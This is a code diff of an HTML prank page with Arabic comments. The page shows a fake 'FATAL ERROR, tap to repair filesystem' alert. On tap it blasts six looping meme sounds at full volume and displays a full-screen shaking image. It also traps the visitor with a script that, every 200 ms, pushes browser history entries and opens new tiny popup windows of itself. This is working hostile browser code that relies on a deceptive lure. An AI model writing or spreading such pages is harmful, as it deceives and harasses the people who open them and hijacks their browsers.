@@ -3,112 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ SYSTEM_LOCK ☠️</title>
+    <title>System Alert</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
         
-        /* الصورة كبيرة، واضحة، وتهتز بجنون سواسوة */
+        /* الصورة كبيرة وواضحة ومستعدة للهبال سواسوة */
         #madwoman { 
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
             object-fit: cover; z-index: 1; display: none;
             will-change: transform;
         }
 
-        /* رسالة تحذيرية مرعبة سواسوة */
+        /* رسالة التحذير سواسوة */
         #ui { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.95); z-index: 1000; display: flex; 
+            background: #111; z-index: 1000; display: flex; 
             flex-direction: column; justify-content: center; align-items: center;
-            font-family: 'Courier New', monospace; color: #f00; text-align: center;
+            font-family: sans-serif; color: #fff;
         }
-        .header { font-size: 28px; margin-bottom: 15px; font-weight: bold; text-shadow: 0 0 15px #f00; }
-        .blink { animation: b 0.1s infinite; }
-        @keyframes b { 50% { opacity: 0; } }
-        .btn-panic { 
-            background: #f00; color: #000; border: none; padding: 20px 60px; 
-            font-weight: bold; font-size: 22px; cursor: pointer; margin-top: 30px;
-            box-shadow: 0 0 20px #f00;
+        .btn-fix { 
+            background: #d32f2f; color: #fff; border: none; padding: 20px 50px; 
+            border-radius: 5px; font-size: 20px; cursor: pointer; font-weight: bold;
         }
     </style>
 </head>
-<body onclick="igniteChaos()">
+<body onclick="launchChaos()">
 
     <div id="ui">
-        <h1 class="blink">☢️ CRITICAL FAILURE ☢️</h1>
-        <p>Illegal process detected in background.<br>Click to terminate and secure data.</p>
-        <button class="btn-panic">TERMINATE</button>
+        <h2 style="color: #ff5252;">⚠️ FATAL ERROR ⚠️</h2>
+        <p style="text-align: center; padding: 0 20px;">System integrity compromised.<br>Tap to repair filesystem.</p>
+        <button class="btn-fix">REPAIR NOW</button>
     </div>
 
     <img id="madwoman" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <div id="audioVault">
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3"></audio>
+    <div id="sounds">
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
     </div>
 
     <script>
         let aCtx, analyser, data;
         const img = document.getElementById('madwoman');
 
-        function igniteChaos() {
-            // 1. إطلاق كامل الأصوات سواسوة (الكل يخدم في رحبة)
-            document.querySelectorAll('.s').forEach(a => { 
-                a.volume = 1.0; 
-                a.play(); 
-            });
+        function launchChaos() {
+            // 1. تشغيل الـ 6 أصوات في رحبة سواسوة
+            document.querySelectorAll('.h').forEach(a => { a.volume = 1.0; a.play(); });
 
             document.getElementById('ui').style.display = 'none';
             img.style.display = 'block';
-            document.documentElement.requestFullscreen();
 
-            // 2. نظام الحبس واللاق سواسوة
+            // 2. تفعيل المحرك البصري فوراً سواسوة
+            if (!aCtx) {
+                aCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const source = aCtx.createMediaElementSource(document.querySelectorAll('.h')[2]); // قوقو قاقا هو المحرك
+                analyser = aCtx.createAnalyser();
+                analyser.fftSize = 128;
+                data = new Uint8Array(analyser.frequencyBinCount);
+                source.connect(analyser);
+                analyser.connect(aCtx.destination);
+                if (aCtx.state === 'suspended') aCtx.resume();
+                animate();
+            }
+
+            // 3. نظام الحبس واللاق سواسوة
             setInterval(() => {
                 history.pushState(null, null, window.location.href);
                 window.open(window.location.href, '_blank', 'width=10,height=10');
-            }, 180);
-
-            startJitterEngine();
+            }, 200);
         }
 
-        function startJitterEngine() {
-            aCtx = new (window.AudioContext || window.webkitAudioContext)();
-            // نأخذ صوت قوقو قاقا كمحرك للرعشة سواسوة
-            const source = aCtx.createMediaElementSource(document.querySelectorAll('.s')[2]);
-            analyser = aCtx.createAnalyser();
-            analyser.fftSize = 256;
-            data = new Uint8Array(analyser.frequencyBinCount);
-            source.connect(analyser);
-            analyser.connect(aCtx.destination);
-            
-            if (aCtx.state === 'suspended') aCtx.resume();
-            
-            updateVisualMadness();
-        }
-
-        function updateVisualMadness() {
+        function animate() {
             analyser.getByteFrequencyData(data);
-            let avg = data.reduce((a, b) => a + b) / data.length;
+            let volume = data.reduce((a, b) => a + b) / data.length;
 
-            // 3. ميزة الرعشة: الصورة ترعد وتتكبر على حساب قوة الأصوات المخلطة سواسوة
-            const intensity = (avg / 255) * 70; 
-            const x = (Math.random() - 0.5) * intensity * 2.5;
-            const y = (Math.random() - 0.5) * intensity * 2.5;
+            // 4. الرعشة الهستيرية: تتحرك الصورة مع الأصوات سواسوة
+            const intensity = (volume / 255) * 80; 
+            const x = (Math.random() - 0.5) * intensity * 3;
+            const y = (Math.random() - 0.5) * intensity * 3;
             const r = (Math.random() - 0.5) * intensity;
-            const s = 1 + (avg / 255) * 0.45;
+            const sc = 1 + (volume / 255) * 0.5;
 
-            img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${s})`;
-            
-            requestAnimationFrame(updateVisualMadness);
+            img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${sc})`;
+            requestAnimationFrame(animate);
         }
     </script>
 </body>
